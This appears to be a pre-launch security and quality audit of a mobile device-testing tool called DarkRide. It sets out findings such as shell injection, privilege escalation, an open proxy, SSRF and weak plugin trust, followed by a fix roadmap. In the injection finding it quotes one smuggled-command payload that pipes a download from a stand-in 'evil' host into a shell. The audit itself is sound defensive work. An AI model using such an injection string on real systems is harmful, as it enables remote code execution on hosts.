# DarkRide — Pre-Launch Critical Review & Roadmap

*Prepared 2026-07-08. Based on a code-grounded review of the current `main` (v1.0.0 released, `package.json` at 1.1.0-dev), covering security, backend, frontend, Python bridges, tests/quality, and docs/release hygiene. All suites were actually run; all findings were confirmed against code with file:line evidence.*

---

## Verdict

**Not ready for a broad public launch yet — but the gap is a focused list of defects, not a rewrite.**

The fundamentals are genuinely strong: migrations dodge the known Drizzle journal bug, lifecycle/shutdown/sandbox cleanup is careful, tech-debt markers are near-zero (1 TODO, 0 `@ts-ignore`, 0 `eslint-disable` in backend), and everything that runs is green — **4,037 backend + 1,153 frontend + 257 Python tests pass, 0 typecheck errors, 0 lint warnings**. Auth crypto (OAuth/PKCE, API-key scope intersection, Argon2id, brute-force lockout, WS origin checks, default 127.0.0.1 bind) is sound.

What blocks launch is a cluster of **remote-code-execution and privilege-escalation defects** that matter the moment DarkRide is multi-user or reachable on a LAN, plus one **unauthenticated device-control server**, an **unmerged streaming-reliability fix**, **no frontend error boundaries**, and a **completely skipped AI-agent test suite** with **no eval harness at all** (a direct CLAUDE.md violation).

---

## Critical review by area

### Security — the launch-gating area

Confirmed exploitable, ranked:

**P0 / BLOCKER**

1. **Unauthenticated device-control server on all interfaces.** `python/bridge.py:1846` runs Flask on `host='0.0.0.0'` and `/rpc` (`bridge.py:1746`) has no auth token or origin check. Any host on the LAN (or the internet if the port 9100–9199 is forwarded) can run arbitrary Frida JS in any app, screenshot, tap/type/swipe, and read/write arbitrary files (`handle_frida_inject_apk`, `bridge.py:1643`). The iOS bridge already does this right (`ios_bridge.py:1534` binds `127.0.0.1`). Cheap fix, highest severity.

2. **Host shell command injection via `deviceId` and `durationMs`.** `backend/websocket/live-stream.ts` uses `exec`/`execAsync` with shell-string template literals across 33+ call sites (e.g. `:1034`, `:1230-1235`, `:1721-1723`), interpolating WebSocket-supplied `deviceId` with no validation and no connected-device allowlist. A client with `core.devices:read`/`:manage` sends `deviceId: "x; curl evil|sh #"` → arbitrary host RCE, including via the `su -c` root paths. `durationMs` in `device-swipe` is a second, unrounded vector. The safe pattern (`execFile('adb', [...])`) is used 103× elsewhere in the same codebase.

3. **Host shell command injection via `packageName`.** `backend/services/apk-tracker.ts:710` shells `adb ... dump-icon ${packageName}` with a value that reaches it from `POST /v1/device/pull-apk/:deviceId` (`backend/api/apps.ts:573`), which — unlike its sibling routes — never calls `isValidPackageName`. Poisoned `trackedApps` row → background poller → host RCE with only `core.apk:manage`.

4. **Privilege escalation: unrestricted scope grants.** `backend/api/admin-users.ts:92-99` (`PATCH /v1/admin/users/:id`) and `backend/auth/claim-manager.ts:16-56` let a caller with the *narrow, delegable* `core.users:admin` scope set any user's `scopes` to `core.admin:*` — no check that granted scopes ⊆ granter's scopes. `ApiKeyManager.create()` enforces exactly this subset check; the user endpoints don't. A "user admin" self-escalates to super-admin in one call.

**P1 / HIGH**

5. **Open, unauthenticated forward proxy.** `backend/services/mitmproxy-manager.ts:297-336` (emulator `emu-http-proxy` capture mode) binds `mitmdump` to `0.0.0.0` with no `proxyauth` and no source-IP allowlist — a full open relay / internal-network pivot, outside the Express auth stack entirely.

6. **SSRF: private-IP filter bypassed by redirect-following.** `backend/api/proxied-requests.ts:89-93` validates only the initial URL; `proxied-request-service.ts:280-299` follows `Location` redirects (`followRedirects` defaults true) without re-validating → reach `169.254.169.254` / loopback / internal Docker hosts. Compounded by **the same endpoint having no `requires:` scope at all** (`proxied-requests.ts:82,122`) — available to the lowest-privilege authenticated principal.

7. **Plugin trust model is decorative at the point that matters.** Signature verification (`PluginVerifier`) runs *once* at the install HTTP call and is **never re-checked at boot** where `import()`/`register(ctx)` actually executes code (`backend/plugins/discover.ts:92,259`, `plugin-manager.ts:107`). Unsigned/untrusted installs are gated only by a client-supplied `confirmed:true` field in the same JSON body. Content-pinning (`npmShasum`/`gitRef`) is optional, so a "verified" badge can cover metadata only. And there is **zero process isolation** — plugin code has full Node privileges (`require('child_process')`, host DB, other plugins' memory) in the same process that drives adb/frida/shell. The crypto primitive itself is sound (no self-signing bypass, admin-gated trust store, TOCTOU defended when pinned).

**P2 / MED** — session-revoke IDOR (`profile.ts:100`), unscoped file-serving route (`file-serving.ts:24`, any authed user reads any plugin's files), DNS-rebinding TOCTOU on the SSRF check, admin-scoped SSRF via AI-provider `baseUrl`, DDL identifier interpolation in `schema-validator.ts:79,224`, plaintext secrets at rest (documented/accepted in SECURITY.md), bootstrap-admin TOCTOU race.

**Verified sound:** OAuth PKCE (S256-only) + exact redirect_uri match, CSRF on consent, MCP endpoint auth, refresh-token reuse detection, API-key scope intersection on *every* request, Argon2id + password policy, per-IP + progressive-lockout brute-force defense, session fixation prevention, WS Origin allowlist, no CORS grant (same-origin by default), default `HOST=127.0.0.1` with loud warnings on `0.0.0.0`, secret masking on settings/AI-provider read paths, no secret logging.

### Backend

Notably healthy for a v1.0. Confirmed clean: migration ordering (sorts by `idx`, ignores `when` — the documented Drizzle bug *cannot* occur here), per-plugin migration isolation, drizzle `sql\`\`` value parameterization (no SQL injection), streaming/capture lifecycle teardown, isolated-vm sandbox disposal, process-level `uncaughtException`/shutdown handling.

Gaps: **observability is the top non-security gap** — logs are a 200-entry in-memory ring buffer (`backend/logs.ts:22`), never persisted, built on a `console.log` monkey-patch, no structured logging (pino/winston) and no metrics (prom-client/OTel). A production incident leaves almost no trail. God-modules: `ai-tool-definitions.ts` (4,035 lines), `live-stream.ts` (1,916), `device-manager.ts` (1,827). DB handle not closed on shutdown (benign under WAL). `as any` count 181, mostly at genuine plugin/DB/isolate boundaries.

### Frontend

Broad and well-mannered on the happy path — near-universal loading/error/empty states, solid WS reconnect with capped exponential backoff and channel re-subscription, low tech debt (1 TODO, 0 `@ts-ignore`).

Gaps: **no React error boundary anywhere** (`grep` for `componentDidCatch`/`getDerivedStateFromError` = 0 hits) — any render throw blanks the whole app, and plugin pages render inside `Suspense` with no error fallback, so a third-party plugin crash takes down the host UI. The **streaming-reliability fix is unmerged** — the worker/OffscreenCanvas decode path and join-time keyframe work (commits `0945e86`, `afd3bb1`) are not in `main`; `h264-decoder.ts` on `main` still decodes on the main thread, and the scrcpy SIGABRT (code 134) root cause was never closed. Stream health metrics are collected (`DeviceViewer.tsx:332`) but surfaced nowhere (`VideoHealthIndicator` is a 14-line stub), so regressions are invisible. God-components: `DeviceView.tsx` (1,800 lines), `ApkAnalysis.tsx` (1,545), `DeviceViewer.tsx` (643). APK flow sprawls across three similar-looking landing spots (matches the ROADMAP "messy" admission). ~204 inline hex colors bypass the light-theme system. Accessibility thin (video canvas has no role/aria/keyboard path). The ROADMAP "live-log drawer regression" appears already fixed in `main`.

### Python bridges

Beyond the P0 unauth server (#1 above), five whole-system reliability defects:

- **iOS pairing is a silent no-op** — `ios_bridge.py:358` calls `client.pair()` (an `async def`) without `await`, discards the coroutine, returns `{"success":true}`. iOS onboarding is dead; the test uses a sync mock so it passes anyway.
- **Frida controlled-spawn loses all script output** — `bridge.py:1595` registers only `on('message')`; per Frida 17.x, `console.log` isn't captured in controlled-spawn mode (the mode needed to bypass SecNeo), but the entire built-in script library logs via `console.log`. 100% of bypass-script output vanishes.
- **Blocking webhooks freeze the proxy** — `mitmproxy_bridge.py:558,787,813` call blocking `urllib.request.urlopen` (5–10s timeouts) inside async hooks on mitmproxy's single event-loop thread; a slow/restarting Node backend stalls every device's every flow.
- **`delay` intercept action calls `time.sleep()`** inside an async hook (`mitmproxy_bridge.py:508`) — one delay rule freezes all devices' traffic.
- **TLS/client-cert spoofing broken in WireGuard mode (the primary capture path)** — `tls_start_server` (`mitmproxy_bridge.py:706-761`) uses `data.conn.address[0]` (an IP) instead of `.sni`; domain-keyed certs never match and no SNI goes upstream. The test asserts the buggy behavior as correct.

Untrusted-APK worker hardening (near-blocker): decompression-bomb OOM (uncapped `zf.read`), no timeout on in-process APK/DEX parse, XML billion-laughs in `parse_manifest` (no `defusedxml`) — any of these lets one crafted upload crash the shared single-threaded analyzer and drop all queued jobs. Plus: **frida/frida-tools completely unpinned** in `requirements.txt` (a fresh install pulls frida 18.x and breaks the documented 17.x integration; CI is not reproducible), no shutdown/signal handlers (orphaned WDA/frida processes), WDA subprocess pipes never drained (deadlock), Windows encoding gaps (`text=True` → cp1252 → `UnicodeDecodeError` on CJK app labels).

Verified sound: no bare `except`, every `subprocess.run` has a timeout, no `shell=True`/`os.system` (so no injection on the Python side), and the documented mitmproxy 12.2.1 / Frida 17.x / pyOpenSSL gotchas are mostly handled correctly (the SNI bug is the one exception).

### Tests & quality

All green: typecheck 0 errors (~90s), backend 4,037 passed / 55 skipped (189s), frontend 1,153 passed / 0 skipped (35s), Python 257 passed / 4 skipped (25s), lint 0/0. The ROADMAP's "~3400/950/200" counts *understate* reality.

Two real problems: (1) **the entire AiAgent test suite is disabled** — 35 `it.skip` in `backend/services/ai-agent.test.ts` behind an unlanded "Task 11" refactor, so the AI agent (conversation persistence, tool-call loop, maxTurns, abort) ships with zero executing tests. (2) **The CLAUDE.md-mandated eval harness does not exist** — no `evals/` dir, no `*.eval.*`, no eval script anywhere; the two-lane "gate tests + periodic evals" model is gate-tests-only, and the LLM features that most need evals have none. Minor: `pytest` only collects from repo root (`test_ios_bridge.py` uses `from python.ios_bridge import`), a CI landmine with no conftest fix.

### Docs & release hygiene

Mostly clean — README commands/env vars all real, all screenshots present, full legal/community file set, `.env` gitignored, working tree clean, CHANGELOG current. Issues: internal design specs committed to the public tree (`docs/specs/`, `docs/superpowers/`), ROADMAP "Last updated" stale (2026-05-17), `DARKRIDE_DOCKER_BRIDGE_GATEWAY` undocumented (`environment.md`), no `getting-started.md` first-capture walkthrough, and the deployed `.env` still carries the pre-auth-era "DarkRide has NO built-in authentication" warning that contradicts the shipped auth system.

---

## Pre-launch roadmap

### P0 — Ship-blockers (must land before broad launch)

| # | Item | Files | Effort |
|---|------|-------|--------|
| 1 | Bind `bridge.py` to `127.0.0.1`; add a shared-secret token on `/rpc` matching the Node side | `python/bridge.py:1846,1746` | S |
| 2 | Convert all `exec`/`execAsync` ADB calls to `execFile` array-args + validate `deviceId` against connected-device set; round/validate `durationMs` | `backend/websocket/live-stream.ts` (33+ sites), `backend/services/apk-tracker.ts:710` | M |
| 3 | Add `isValidPackageName` to `POST /v1/device/pull-apk/:deviceId` | `backend/api/apps.ts:573` | S |
| 4 | Enforce granted-scopes ⊆ granter-scopes on user create/edit (reuse `scopeMatches`) | `backend/api/admin-users.ts:92`, `backend/auth/claim-manager.ts` | S |
| 5 | Add `proxyauth` (or bind to docker-bridge subnet + iptables) to the emu forward proxy | `backend/services/mitmproxy-manager.ts:297` | M |
| 6 | Re-validate every redirect hop against `isPrivateHost`; add a `requires:` scope to `/v1/proxied-request*` | `backend/services/proxied-request-service.ts:280`, `backend/api/proxied-requests.ts:82,122` | S |
| 7 | Decide the plugin trust story: either re-verify signatures at boot-load + make `confirmed` a real server-side approval + mandatory content-pinning, **or** explicitly scope launch to first-party plugins only and drop the "verified marketplace" framing until isolation lands | `backend/plugins/discover.ts`, `plugin-manager.ts`, `services/plugin-verifier.ts` | L |
| 8 | Add a top-level React error boundary + a per-plugin-route boundary with a recovery fallback | `frontend/App.tsx:321-363` | S |
| 9 | Land or explicitly beta-gate the streaming-worker branch; close the scrcpy SIGABRT root cause or ship with a documented device caveat | `frontend/lib/video/*`, `STREAM_DEBUG_HANDOFF.md` | M–L |
| 10 | Pin `frida`/`frida-tools` (and `cryptography`/`pyOpenSSL` to the tested range) in `requirements.txt`; fix pytest root-collection with a conftest | `python/requirements.txt` | S |
| 11 | Fix iOS pairing `await`; fix Frida controlled-spawn output capture (`send()`), and replace the sync mocks that hide both | `python/ios_bridge.py:358`, `python/bridge.py:1595` | M |
| 12 | Move mitmproxy webhook delivery + `delay` off the event loop (thread pool / `asyncio.to_thread`) | `python/mitmproxy_bridge.py:508,558,787,813` | M |
| 13 | Fix TLS SNI in WireGuard mode: use `.sni` with `address[0]` fallback | `python/mitmproxy_bridge.py:706-761` | S |
| 14 | Harden the APK worker against hostile input: cap inflated size, timeout in-process parse, `defusedxml` for manifests, run analyzer per-job or in a subprocess that can be killed | `python/apk_analyzer.py` | M |

### P1 — Strongly recommended before launch

- **Persistent, structured logging + basic metrics** (`backend/logs.ts`) — highest-value non-security fix; without it, post-launch incidents are undebuggable. Add pino (file + rotation) and a minimal `/metrics` (gap count, keyframe requests, decoder resets, job failures).
- **Un-skip or delete-and-rewrite the AiAgent suite** — land Task 11 or restore coverage; the flagship AI feature currently has zero executing tests.
- **Stand up the eval harness** the CLAUDE.md mandates — start with the AI agent (tool-call correctness, refusal/cutoff behavior) and APK version-diff summaries; wire a nightly + pre-ship threshold.
- **Surface stream health metrics in the UI** — the data is already collected; give `VideoHealthIndicator` the real states so streaming regressions stop being invisible.
- **Close the MED authz gaps** — session-revoke ownership check, scope-gate `/v1/files/:namespace/*`, DNS-rebinding pin-to-resolved-IP on the SSRF path.
- **Release hygiene** — remove `docs/specs/`+`docs/superpowers/` from the public tree, write `docs/getting-started.md` (claim URL → first capture), fix the stale `.env` auth warning, document `DARKRIDE_DOCKER_BRIDGE_GATEWAY`, refresh the ROADMAP date, and add the `Secure`-cookie-behind-proxy note to deploy docs.

### P2 — Nice to have before launch

- Break up the god-modules (`ai-tool-definitions.ts`, `live-stream.ts`, `device-manager.ts`, `DeviceView.tsx`, `ApkAnalysis.tsx`) — not a launch bug, but this is exactly where the stream/injection regressions hide.
- APK page IA rework + drag-and-drop upload (ROADMAP item, real friction for a launch demo).
- Light-theme audit for the ~204 inline hex colors.
- Python bridge robustness tail: shutdown/signal handlers, WDA pipe draining, Windows encoding/`creationflags`, `defusedxml`, replace Werkzeug dev server with waitress.

---

## Post-launch roadmap (short)

Prioritized by value ÷ effort, drawing on the existing NEXT.md/ROADMAP where it still holds:

1. **Android logcat streaming** — high value, low-med effort; reuses the existing WS log infra and adb-shell channel. First thing to build post-launch.
2. **OpenAPI/Swagger for the REST API** — low effort, makes the whole surface self-documenting for automation authors; pairs with the "auto-generated API docs from captured traffic" idea.
3. **Live intercept rules in the UI** — modify traffic in real time (replace body, inject headers, rewrite URLs). Highest-demand capability gap for the core audience.
4. **Traffic replay / request builder** — right-click a captured request → edit → resend → view response.
5. **Raw TCP stream capture** — unlocks non-HTTP mobile protocols (MQTT-over-TCP, game protocols) and is the single biggest enabler for the protocol-decoder plugin ecosystem.
6. **Plugin process isolation** (if not done as P0-#7) — move plugin execution into workers/isolates with a real capability boundary, so the signed-marketplace story becomes true rather than cosmetic. This is the strategic unlock for a third-party ecosystem.
7. **On-device file-system browser** — browsable `/data/data/<pkg>` tree, pull/push, view SharedPrefs/DBs; reuses terminal + pull plumbing.
8. **OCR + screen-classification AI tools** — lets the agent act on Flutter/RN-canvas/obfuscated apps where the a11y tree is empty.
9. **Customisable dashboard + plugin-contributed widgets** — already scoped in ROADMAP; good first showcase of the widget-contribution API.
10. **iOS Phase 2 (screen streaming + control)** — gated on a one-time macOS session to compile WebDriverAgent; the Phase-2 code (MJPEG, touch, WDA install) already exists and needs the signing artifacts to unblock.

**Transport bet to evaluate (not a sprint):** WebRTC for physical devices (jitter buffer, NACK/PLI keyframe recovery, congestion-controlled bitrate for free — replaces the hand-rolled backpressure and the "bitrate change = full scrcpy restart" stall). Emulator WebRTC infra already exists to build on.
